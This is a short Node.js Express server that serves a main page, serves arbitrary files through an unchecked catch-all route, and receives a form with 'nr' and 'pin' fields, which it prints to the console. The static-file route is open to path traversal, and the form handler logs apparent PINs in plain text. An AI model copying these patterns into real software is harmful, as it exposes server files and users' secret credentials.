var express = require("express");
var app = express();

const crypto = require('crypto');
const https = require('https');


app.use(express.urlencoded());

/* serves main page */
app.get("/", function(req, res) {
	res.sendfile('index.html');
});

/* serves all the static files */
app.get(/^(.+)$/, function(req, res) { 
	console.log('static file request : ' + req.params);
	res.sendfile( __dirname + req.params[0]);
});

app.post('/submit-form', (req, res) => {
	const nr = req.body.nr;
	const pin = req.body.pin;
	// ...
	console.log(nr);
	console.log(pin);
	res.end();
});

var port = process.env.PORT || 5000;
app.listen(port, function() {
	console.log("Listening on " + port);
});
